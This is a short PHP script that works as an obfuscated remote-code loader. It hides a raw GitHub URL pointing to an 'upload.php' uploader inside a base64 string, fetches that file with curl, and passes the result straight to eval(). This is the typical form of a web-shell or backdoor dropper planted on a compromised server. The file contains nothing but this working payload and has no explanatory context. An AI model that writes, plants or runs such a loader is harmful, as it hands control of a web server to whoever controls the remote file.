<?php
function get($u){$c=curl_init();curl_setopt($c,CURLOPT_HEADER,0);curl_setopt($c,CURLOPT_RETURNTRANSFER,1);curl_setopt($c,CURLOPT_URL,$u);$d=curl_exec($c);curl_close($c);return $d;}
$x='?>';
eval($x.get(base64_decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0pheUMwYzRDb0w0L1VwbG9hZGVyLWZpbGUvcmVmcy9oZWFkcy9tYWluL3VwbG9hZC5waHA=')));
?>
